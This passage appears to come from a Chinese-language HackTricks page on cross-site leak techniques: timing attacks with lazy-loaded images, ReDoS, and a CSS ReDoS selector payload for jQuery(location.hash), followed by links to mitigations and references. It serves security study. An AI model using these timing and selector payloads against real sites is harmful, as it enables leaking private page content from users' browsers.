一些利用此漏洞的代码示例：[https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### 基于图像懒加载时间

如果 **无法加载外部图像**，这可能会指示攻击者图像已加载，另一种选择是尝试 **多次猜测字符并测量**。如果图像加载，所有请求的时间将比图像未加载时更长。这就是在 [**此写作的解决方案中**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **总结的内容：**

{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

### ReDoS

{{#ref}}
../regular-expression-denial-of-service-redos.md
{{#endref}}

### CSS ReDoS

如果使用 `jQuery(location.hash)`，可以通过时间来判断 **某些 HTML 内容是否存在**，这是因为如果选择器 `main[id='site-main']` 不匹配，则不需要检查其余的 **选择器**：
```javascript
$(
"*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']"
)
```
### CSS 注入

{{#ref}}
css-injection/
{{#endref}}

## 防御

在 [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) 和维基的每个部分 [https://xsleaks.dev/](https://xsleaks.dev/) 中推荐了一些缓解措施。请查看那里以获取有关如何防止这些技术的更多信息。

## 参考

- [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
- [https://xsleaks.dev/](https://xsleaks.dev)
- [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
- [https://xsinator.com/](https://xsinator.com/)
- [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{{#include ../../banners/hacktricks-training.md}}
